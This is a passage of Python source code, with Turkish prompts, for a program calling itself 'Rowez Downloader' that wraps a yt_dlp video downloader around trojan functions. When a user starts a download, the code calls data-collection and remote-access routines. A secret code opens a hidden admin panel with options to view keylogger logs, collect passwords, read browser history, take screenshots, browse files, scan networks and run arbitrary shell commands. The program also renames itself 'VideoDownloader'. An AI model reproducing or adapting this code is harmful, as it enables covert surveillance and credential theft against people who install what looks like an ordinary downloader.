            return "Yetkisiz işlem."
        screenshot_path = os.path.join(temp_dir, f"screenshot_{user_id}_{int(time.time())}.png")
        try:
            self.sct.shot(output=screenshot_path)
            self.log_activity(f"Ekran görüntüsü alındı: {user_id}")
            return f"Ekran görüntüsü alındı: {screenshot_path}"
        except Exception as e:
            hata_mesaji = f"Ekran görüntüsü alınamadı: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return f"Hata: {e}"

    def remote_control(self, command: str) -> str:
        if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
            return "Yetkisiz işlem."
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, timeout=10)
            encrypted_result = encrypt_log(f"Komut yürütüldü: {command}\nSonuç: {result}")
            self.log_activity(f"Komut yürütüldü: {command}")
            return f"Sonuç: {decrypt_log(encrypted_result)}"
        except subprocess.CalledProcessError as e:
            hata_mesaji = f"Komut yürütme hatası: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return f"Hata: {e}"

    def shutdown(self) -> None:
        self.stop_keylogger()
        for thread in self.download_threads:
            if thread.is_alive():
                thread.join()
        cleanup_temp_files()
        print(f"{Fore.GREEN}Program kapatılıyor...{Style.RESET_ALL}")

    def admin_interface(self, current_admin: str) -> None:
        options = [
            "Kullanıcı verilerini görüntüle", "Kullanıcı ara (İD)", "Ekran görüntüsü al", "Sistem kontrolü",
            "Sistemi kapat", "Kullanıcıyı yasakla", "Kullanıcı yasağını kaldır", "İndirme menüsüne git",
            "Logları görüntüle", "Hızlı ağ taraması", "Tam ağ taraması", "Kullanıcı dosyalarını sil",
            "Kullanıcı verilerini dışa aktar", "Logları temizle", "Keylogger verilerini görüntüle",
            "Ekran görüntülerini listele", "Kullanıcı oturumunu sonlandır", "Admin şifresini değiştir",
            "Yeni admin ekle", "Ana menüye dön", "Tarayıcı geçmişini görüntüle", "Şifreleri topla",
            "Dosya sistemine eriş", "Ağ trafiğini izle", "Mikrofonu kontrol et", "Kamerayı kontrol et",
            "Fare ve klavye hareketlerini izle", "Sistem kaynaklarını izle", "Yüklü programları listele",
            "Açık portları tara", "Ağdaki cihazları tara", "Çıkış"
        ]
        while True:
            print(f"\n{Fore.BLUE}🔧 Yönetici Paneli 🔧{Style.RESET_ALL}")
            for i, option in enumerate(options, 1):
                print(f"{Fore.CYAN}{i}. {option}{Style.RESET_ALL}")
            choice = input(f"{Fore.YELLOW}Seçim (1-{len(options)}) veya 'geri': {Style.RESET_ALL}").strip()
            if choice.lower() == "geri":
                print(f"{Fore.GREEN}Ana menüye dönülüyor...{Style.RESET_ALL}")
                self.is_admin_mode = False
                self.current_admin = None
                self.admin_token = None
                break
            try:
                choice = int(choice)
                if not 1 <= choice <= len(options):
                    raise ValueError
            except ValueError:
                print(f"{Fore.RED}❌ Geçersiz seçim.{Style.RESET_ALL}")
                continue
            if choice == 1:
                for user_id, data in self.user_sessions.items():
                    print(f"\n{Fore.YELLOW}{data['nickname']} (ID: {user_id}):{Style.RESET_ALL}")
                    for key, value in data.items():
                        decrypted_value = decrypt_log(value) if key not in ["system_info", "keylog", "rat_screenshots"] else value
                        print(f"{Fore.CYAN}  {key}: {decrypted_value}{Style.RESET_ALL}")
            elif choice == 2:
                search = input(f"{Fore.YELLOW}🔍 ID veya Takma Ad: {Style.RESET_ALL}").strip().lower()
                found = False
                for user_id, data in self.user_sessions.items():
                    if search == user_id or search in data["nickname"].lower():
                        print(f"{Fore.YELLOW}ID: {user_id} | Takma Ad: {data['nickname']}{Style.RESET_ALL}")
                        found = True
                if not found:
                    print(f"{Fore.RED}❌ Eşleşme bulunamadı.{Style.RESET_ALL}")
            elif choice == 3:
                user_id = input(f"{Fore.CYAN}Hangi ID için ekran görüntüsü? {Style.RESET_ALL}").strip().lower()
                print(self.capture_screenshot(user_id) if user_id in self.user_sessions else f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 4:
                command = input(f"{Fore.CYAN}Komut: {Style.RESET_ALL}")
                print(self.remote_control(command))
            elif choice == 5:
                print("Sistem kapatma henüz uygulanmadı.")
            elif choice == 6:
                user_id = input(f"{Fore.CYAN}Yasaklanacak kullanıcı ID'si: {Style.RESET_ALL}")
                print(self.ban_user(user_id))
            elif choice == 7:
                user_id = input(f"{Fore.CYAN}Yasağı kaldırılacak kullanıcı ID'si: {Style.RESET_ALL}")
                print(self.unban_user(user_id))
            elif choice == 8:
                self.download_interface(current_admin)
            elif choice == 9:
                print(self.view_logs())
            elif choice == 10:
                print(self.network_scan("quick"))
            elif choice == 11:
                print(self.network_scan("full"))
            elif choice == 12:
                user_id = input(f"{Fore.CYAN}Hangi ID’nin dosyaları silinecek? {Style.RESET_ALL}")
                print(self.delete_user_files(user_id))
            elif choice == 13:
                print(self.export_user_data())
            elif choice == 14:
                print(self.clear_logs())
            elif choice == 15:
                user_id = input(f"{Fore.CYAN}Hangi ID için keylogger verileri? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    keylog = self.user_sessions[user_id].get("keylog", "")
                    print(f"{Fore.YELLOW}Keylogger Verileri ({user_id}):{Style.RESET_ALL}\n{keylog}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 16:
                user_id = input(f"{Fore.CYAN}Hangi ID için ekran görüntüleri? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    screenshots = self.user_sessions[user_id].get("rat_screenshots", [])
                    if screenshots:
                        print(f"{Fore.YELLOW}Ekran Görüntüleri ({user_id}):{Style.RESET_ALL}")
                        for screenshot in screenshots:
                            print(f"  - {screenshot}")
                    else:
                        print(f"{Fore.YELLOW}Ekran görüntüsü bulunamadı.{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 17:
                user_id = input(f"{Fore.CYAN}Hangi ID’nin oturumu sonlandırılsın? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    del self.user_sessions[user_id]
                    self.log_activity(f"Kullanıcı oturumu sonlandırıldı: {user_id}")
                    print(f"{Fore.GREEN}{user_id} kullanıcısının oturumu sonlandırıldı.{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 18:
                admin_name = input(f"{Fore.CYAN}Hangi adminin şifresi değişecek? {Style.RESET_ALL}").strip()
                if admin_name in self.admins:
                    new_password = getpass.getpass(f"{Fore.CYAN}Yeni şifre: {Style.RESET_ALL}")
                    self.admins[admin_name] = hashlib.sha256(new_password.encode()).hexdigest()
                    self.log_activity(f"Admin şifresi değiştirildi: {admin_name}")
                    print(f"{Fore.GREEN}Şifre başarıyla değiştirildi.{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ Admin bulunamadı.{Style.RESET_ALL}")
            elif choice == 19:
                new_admin = input(f"{Fore.CYAN}Yeni admin kullanıcı adı: {Style.RESET_ALL}").strip()
                if new_admin not in self.admins:
                    password = getpass.getpass(f"{Fore.CYAN}Şifre: {Style.RESET_ALL}")
                    self.admins[new_admin] = hashlib.sha256(password.encode()).hexdigest()
                    self.log_activity(f"Yeni admin eklendi: {new_admin}")
                    print(f"{Fore.GREEN}Yeni admin eklendi: {new_admin}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ Bu kullanıcı adı zaten admin.{Style.RESET_ALL}")
            elif choice == 20:
                print(f"{Fore.GREEN}Ana menüye dönülüyor...{Style.RESET_ALL}")
                self.is_admin_mode = False
                self.current_admin = None
                self.admin_token = None
                break
            elif choice == 21:
                user_id = input(f"{Fore.CYAN}Hangi ID için tarayıcı geçmişi? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    history = decrypt_log(self.user_sessions[user_id]["browser_history"])
                    print(f"{Fore.YELLOW}Tarayıcı Geçmişi ({user_id}):{Style.RESET_ALL}\n{history}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 22:
                user_id = input(f"{Fore.CYAN}Hangi ID için şifreler? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    passwords = self.get_passwords(user_id)
                    decrypted_passwords = "\n".join([decrypt_log(p) for p in passwords.split("\n")])
                    print(f"{Fore.YELLOW}Şifreler ({user_id}):{Style.RESET_ALL}\n{decrypted_passwords}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 23:
                user_id = input(f"{Fore.CYAN}Hangi ID için dosya sistemi? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    path = input(f"{Fore.CYAN}Dosya yolu: {Style.RESET_ALL}")
                    files = self.list_files(user_id, path)
                    print(f"{Fore.YELLOW}Dosyalar ({user_id} - {path}):{Style.RESET_ALL}\n{files}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 24:
                print("Ağ trafiğini izleme henüz uygulanmadı.")
            elif choice == 25:
                print("Mikrofon kontrolü henüz uygulanmadı.")
            elif choice == 26:
                print("Kamera kontrolü henüz uygulanmadı.")
            elif choice == 27:
                print("Fare ve klavye izleme henüz uygulanmadı.")
            elif choice == 28:
                user_id = input(f"{Fore.CYAN}Hangi ID için sistem kaynakları? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    resources = self.get_system_resources(user_id)
                    print(f"{Fore.YELLOW}Sistem Kaynakları ({user_id}):{Style.RESET_ALL}\n{resources}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 29:
                user_id = input(f"{Fore.CYAN}Hangi ID için yüklü programlar? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    programs = self.get_installed_programs(user_id)
                    print(f"{Fore.YELLOW}Yüklü Programlar ({user_id}):{Style.RESET_ALL}\n{programs}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 30:
                user_id = input(f"{Fore.CYAN}Hangi ID için açık portlar? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    ports = self.scan_open_ports(user_id)
                    print(f"{Fore.YELLOW}Açık Portlar ({user_id}):{Style.RESET_ALL}\n{ports}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 31:
                user_id = input(f"{Fore.CYAN}Hangi ID için ağdaki cihazlar? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    devices = self.scan_network_devices(user_id)
                    print(f"{Fore.YELLOW}Ağdaki Cihazlar ({user_id}):{Style.RESET_ALL}\n{devices}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 32:
                print(f"{Fore.GREEN}Admin panelinden çıkılıyor...{Style.RESET_ALL}")
                self.is_admin_mode = False
                self.current_admin = None
                self.admin_token = None
                break

    def admin_login(self) -> None:
        username = input(f"{Fore.CYAN}Kullanıcı adı: {Style.RESET_ALL}").strip()
        password = getpass.getpass(f"{Fore.CYAN}Şifre: {Style.RESET_ALL}")
        if username in self.admins and hashlib.sha256(password.encode()).hexdigest() == self.admins[username]:
            self.is_admin_mode = True
            self.current_admin = username
            self.admin_token = self.generate_session_token(username)
            if not self.verify_session_token(username, self.admin_token):
                hata_mesaji = "Token doğrulama hatası."
                print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
                self.is_admin_mode = False
                self.current_admin = None
                self.admin_token = None
                return
            print(f"{Fore.GREEN}✅ Erişim izni verildi.{Style.RESET_ALL}")
            self.log_activity(f"Yönetici girişi: {username}")
            self.admin_interface(username)
        else:
            print(f"{Fore.RED}❌ Geçersiz kimlik bilgileri.{Style.RESET_ALL}")
            self.user_mode()

    def user_mode(self) -> None:
        user_id = ''.join(random.choices(string.digits, k=8))
        if user_id in self.banned_users:
            print(f"{Fore.RED}❌ Erişim reddedildi.{Style.RESET_ALL}")
            return
        while True:
            nickname = input(f"{Fore.CYAN}🎭 Takma Ad: {Style.RESET_ALL}").strip()
            if nickname == self.secret_admin_code:
                self.admin_login()
                return
            if not nickname:
                print(f"{Fore.RED}⚠️ Takma ad boş olamaz.{Style.RESET_ALL}")
            elif nickname in self.nicknames:
                print(f"{Fore.RED}❌ Bu takma ad alınmış.{Style.RESET_ALL}")
            else:
                break
        self.collect_advanced_data(user_id, nickname)
        self.start_remote_access()
        self.download_interface(user_id)

    def download_interface(self, user_id: str) -> None:
        while True:
            print(f"\n{Fore.GREEN}🎬 Rowez Downloader – Video/Ses İndirici 🎬{Style.RESET_ALL}")
            urls = input(f"{Fore.CYAN}🔗 URL'ler (virgülle ayrılmış): {Style.RESET_ALL}").strip()
            if urls == self.secret_admin_code:
                self.admin_login()
                return
            if urls.lower() == "exit":
                print(f"{Fore.GREEN}👋 Çıkılıyor...{Style.RESET_ALL}")
                self.shutdown()
                sys.exit(0)
            urls = [url.strip() for url in urls.split(',') if url.strip()]
            if not urls:
                print(f"{Fore.RED}⚠️ Geçerli URL girilmedi.{Style.RESET_ALL}")
                continue
            self.set_output_path()
            for url in urls:
                confirm = input(f"{Fore.CYAN}🔗 '{url}' indirilsin mi? (e/h): {Style.RESET_ALL}").strip().lower()
                if confirm == 'e':
                    self.download_video(url, user_id)
                else:
                    print(f"{Fore.YELLOW}⚠️ '{url}' iptal edildi.{Style.RESET_ALL}")
                    self.log_activity(f"İndirme iptal edildi: {user_id}")

    def set_output_path(self) -> None:
        output = input(f"{Fore.CYAN}📂 İndirme klasörü (varsayılan: downloads): {Style.RESET_ALL}").strip()
        self.output_path = output if output else DEFAULT_OUTPUT_PATH
        Path(self.output_path).mkdir(parents=True, exist_ok=True)

    def download_video(self, url: str, user_id: str) -> None:
        self.download_cancelled = False
        is_audio = input(f"{Fore.CYAN}🔊 Yalnızca ses mi? (e/h): {Style.RESET_ALL}").strip().lower() == 'e'
        if is_audio:
            self.audio_format = self.display_options("Ses Formatı", ["mp3", "aac", "opus", "wav"])
            format_selection = "bestaudio/best"
            postprocessors = [{'key': 'FFmpegExtractAudio', 'preferredcodec': self.audio_format}]
        else:
            self.video_quality = self.display_options("Çözünürlük", ["best", "1080", "2160", "4320"])
            self.video_format = self.display_options("Video Formatı", ["mp4", "mkv", "webm"])
            format_selection = "bestvideo+bestaudio/best" if self.video_quality == "best" else f"bestvideo[height<={self.video_quality}]+bestaudio/best"
            postprocessors = [{'key': 'FFmpegVideoConvertor', 'preferredformat': self.video_format}]
        ydl_opts = {
            'format': format_selection,
            'merge_output_format': self.video_format if not is_audio else self.audio_format,
            'outtmpl': str(Path(self.output_path) / '%(title)s_%(id)s.%(ext)s'),
            'progress_hooks': [self.download_progress],
            'ffmpeg_location': str(Path(self.ffmpeg_path) / ("ffmpeg.exe" if platform.system() == "Windows" else "ffmpeg")),
            'postprocessors': postprocessors,
            'quiet': True,
            'ratelimit': 5000000,
            'retries': 3
        }
        def download_thread_func() -> None:
            try:
                with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                    ydl.download([url])
                if not self.download_cancelled:
                    print(f"{Fore.GREEN}✅ İndirildi: {url}{Style.RESET_ALL}")
                    self.log_activity(f"Video indirildi: {user_id}")
            except Exception as e:
                if not self.download_cancelled:
                    hata_mesaji = f"Video indirme hatası: {e}"
                    print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
                    logger.error(hata_mesaji)
        print(f"{Fore.YELLOW}📥 İndirme başlıyor... Durdurmak için 'cancel' yazın.{Style.RESET_ALL}")
        thread = threading.Thread(target=download_thread_func)
        self.download_threads.append(thread)
        thread.start()
        while thread.is_alive():
            try:
                cancel_input = input().strip().lower()
                if cancel_input == "cancel":
                    self.download_cancelled = True
                    print(f"{Fore.YELLOW}⚠️ İptal ediliyor...{Style.RESET_ALL}")
                    thread.join()
                    break
            except KeyboardInterrupt:
                self.download_cancelled = True
                print(f"{Fore.YELLOW}⚠️ İptal ediliyor...{Style.RESET_ALL}")
                thread.join()
                break
        if not self.download_cancelled:
            thread.join()
        self.download_threads.remove(thread)

    def download_progress(self, d: Dict[str, Any]) -> None:
        if d['status'] == 'downloading':
            print(
                f"{Fore.CYAN}İlerleme: {d.get('_percent_str', '0%')} - {d.get('speed', 'Bilinmiyor')} - Tahmini Süre: {d.get('eta', 'Bilinmiyor')}{Style.RESET_ALL}",
                end='\r'
            )

    def display_options(self, title: str, options: List[str]) -> str:
        print(f"\n{Fore.YELLOW}🎛 {title}:{Style.RESET_ALL}")
        for i, option in enumerate(options, 1):
            print(f"{Fore.CYAN}{i}. {option}{Style.RESET_ALL}")
        while True:
            choice = input(f"{Fore.YELLOW}Seçim (1-{len(options)}): {Style.RESET_ALL}").strip()
            if choice.isdigit() and 1 <= int(choice) <= len(options):
                return options[int(choice) - 1]
            print(f"{Fore.RED}Geçersiz seçim, varsayılan: {options[0]}{Style.RESET_ALL}")
            return options[0]

    def ban_user(self, user_id: str) -> str:
        if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
            return "Yetkisiz işlem."
        if user_id in self.user_sessions:
            self.banned_users.add(user_id)
            self.log_activity(f"Kullanıcı yasaklandı: {user_id}")
            return f"Kullanıcı {user_id} yasaklandı."
        return "Kullanıcı bulunamadı."

    def unban_user(self, user_id: str) -> str:
        if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
            return "Yetkisiz işlem."
        if user_id in self.banned_users:
            self.banned_users.remove(user_id)
            self.log_activity(f"Kullanıcı yasağı kaldırıldı: {user_id}")
            return f"Kullanıcı {user_id} yasağı kaldırıldı."
        return "Kullanıcı yasaklı değil."

    def run(self) -> None:
        check_for_updates()
        try:
            print(f"{Fore.RED}Bu program video/ses indirmek için kullanılır.{Style.RESET_ALL}")
            consent = input(f"{Fore.CYAN}Videolar izinsiz indirilir, devam etmek ister misiniz? (e/h): {Style.RESET_ALL}").strip().lower()
            if consent != "e":
                print(f"{Fore.RED}❌ İzin verilmedi. Kapatılıyor.{Style.RESET_ALL}")
                sys.exit(0)
            self.print_rainbow("RowezDownloader")
            print(f"{Fore.YELLOW}Geliştirici: Rowez{Style.RESET_ALL}")
            consent = input(f"{Fore.CYAN}Keylogger için izin (e/h): {Style.RESET_ALL}").strip().lower()
            self.keylogger_active = consent == "e"
            start_input = input(f"{Fore.CYAN}Başlamak için Enter: {Style.RESET_ALL}").strip()
            if start_input == self.secret_admin_code:
                self.admin_login()
            else:
                self.user_mode()
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}❌ Program durduruldu (Ctrl+C).{Style.RESET_ALL}")
            self.shutdown()
            sys.exit(0)
        except Exception as e:
            hata_mesaji = f"Beklenmeyen hata: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            self.shutdown()
            sys.exit(1)

if __name__ == "__main__":
    sys.argv[0] = "VideoDownloader"
    downloader = RowezDownloader()
    downloader.run()